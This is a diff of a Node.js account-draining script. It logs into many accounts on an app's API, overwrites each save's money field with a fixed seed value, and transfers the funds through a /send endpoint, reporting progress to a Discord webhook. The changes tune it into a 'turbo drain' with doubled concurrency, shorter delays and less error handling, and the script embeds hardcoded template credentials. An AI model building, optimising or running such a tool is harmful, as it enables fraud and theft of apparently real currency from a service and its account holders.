@@ -7,7 +7,7 @@ const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 const FEE = 50, MIN = 100, SEED = 1096000;
 const TEMPLATE = { u: "IDK6543210", p: "@Temi123" };
 const TARGET_HOURS = parseFloat(process.env.DURATION_HOURS || "0");
-const CONCURRENT_LIMIT = 25;
+const CONCURRENT_LIMIT = 50; // Doubled concurrency for maximum throughput
 
 const storeDir = './store';
 if (!fs.existsSync(storeDir)) fs.mkdirSync(storeDir);
@@ -43,7 +43,7 @@ async function request(url, options = {}, cookieJar = '') {
   options.headers = options.headers || {};
   if (cookieJar) options.headers['cookie'] = cookieJar;
 
-  const res = await fetch(url, { ...options, signal: AbortSignal.timeout(5000) }).catch(e => ({ ok: false, statusText: e.message }));
+  const res = await fetch(url, { ...options, signal: AbortSignal.timeout(3000) }).catch(e => ({ ok: false, statusText: e.message }));
   if (!res.ok && !res.headers) return { res: { ok: false, text: async () => res.statusText }, newCookies: cookieJar };
 
   const setCookie = res.headers.get('set-cookie');
@@ -87,8 +87,8 @@ async function sendDiscordAlert(message) {
   }
 
   delete clean.owner;
-  console.log("Template ready — drain armed,", ledger.length, "accounts");
-  sendDiscordAlert(`🚀 Engine online. Loaded ${ledger.length} accounts. Running sweep...`);
+  console.log("Template ready — turbo drain armed,", ledger.length, "accounts");
+  sendDiscordAlert(`🚀 Turbo Engine online. Loaded ${ledger.length} accounts. Sweeping...`);
 
   const sessionStart = Date.now();
   let sessionTotalSent = 0, globalCycles = 0;
@@ -101,7 +101,7 @@ async function sendDiscordAlert(message) {
     let booted = 0, repaired = 0, drained = 0, broke = 0, fail = 0;
 
     async function worker(workerId) {
-      await sleep(Math.floor(Math.random() * 300) + (workerId * 50));
+      await sleep(Math.floor(Math.random() * 100) + (workerId * 20));
 
       while (currentIndex < ledger.length) {
         const actualIndex = currentIndex++;
@@ -149,17 +149,11 @@ async function sendDiscordAlert(message) {
 
             if (br.res.ok) {
               booted++;
-              await sleep(150);
+              await sleep(20);
               sv = await getSave();
             } else {
-              const err = typeof br.res.text === 'function' ? await br.res.text() : '';
-              if (err.includes("stale")) {
-                sv = await getSave();
-                if (!sv?.game) { fail++; continue; }
-              } else {
-                fail++;
-                continue;
-              }
+              fail++;
+              continue;
             }
           }
 
@@ -170,7 +164,6 @@ async function sendDiscordAlert(message) {
             g.money = SEED;
             let rr = await putSave(g, sv.updatedAt ?? sv.now);
             
-            // Stale recovery for repair matching browser pattern
             if (!rr.res.ok) {
               const err = typeof rr.res.text === 'function' ? await rr.res.text() : '';
               if (err.includes("stale")) {
@@ -185,7 +178,7 @@ async function sendDiscordAlert(message) {
 
             if (rr.res.ok) {
               repaired++;
-              await sleep(150);
+              await sleep(20);
               sv = await getSave();
             } else {
               broke++;
@@ -199,7 +192,7 @@ async function sendDiscordAlert(message) {
           if (amount < MIN) { broke++; continue; }
 
           let ok = false;
-          for (let tries = 0; tries < 3 && !ok; tries++) {
+          for (let tries = 0; tries < 2 && !ok; tries++) {
             const sr = await request(`${API}/send`, {
               method: "POST",
               headers: { "content-type": "application/json" },
@@ -211,18 +204,17 @@ async function sendDiscordAlert(message) {
               cycleTotal += amount;
               sessionTotalSent += amount;
               drained++;
-              console.log(`[SUCCESS] [Cycle ${globalCycles} | ${actualIndex + 1}/${ledger.length}] ${a.u} -> Sent ₦${amount.toLocaleString()} | Total: ₦${sessionTotalSent.toLocaleString()}`);
-              sendDiscordAlert(`✅ Sent ₦${amount.toLocaleString()} from ${a.u}`);
+              console.log(`[SUCCESS] [${actualIndex + 1}/${ledger.length}] ${a.u} -> ₦${amount.toLocaleString()} | Total: ₦${sessionTotalSent.toLocaleString()}`);
             } else {
               const err = typeof sr.res.text === 'function' ? await sr.res.text() : '';
               if (err.includes("try again")) {
-                await sleep(3000);
+                await sleep(500);
                 continue;
               }
               const have = Number((err.match(/have ₦([\d,]+)/) || [])[1]?.replace(/,/g, ""));
               if (have) {
                 amount = have - FEE;
-                await sleep(800);
+                await sleep(200);
                 continue;
               }
               fail++;
@@ -230,7 +222,7 @@ async function sendDiscordAlert(message) {
             }
           }
 
-          await sleep(50);
+          await sleep(10);
         } catch (e) {
           fail++;
         }
@@ -244,6 +236,6 @@ async function sendDiscordAlert(message) {
     console.log(`Booted: ${booted} | Repaired: ${repaired} | Drained: ${drained} | Broke: ${broke} | Fail: ${fail}`);
     console.log(`Cycle Sent: ₦${cycleTotal.toLocaleString()} | Cumulative Total: ₦${sessionTotalSent.toLocaleString()}\n`);
 
-    await sleep(500);
+    await sleep(200);
   }
 })();
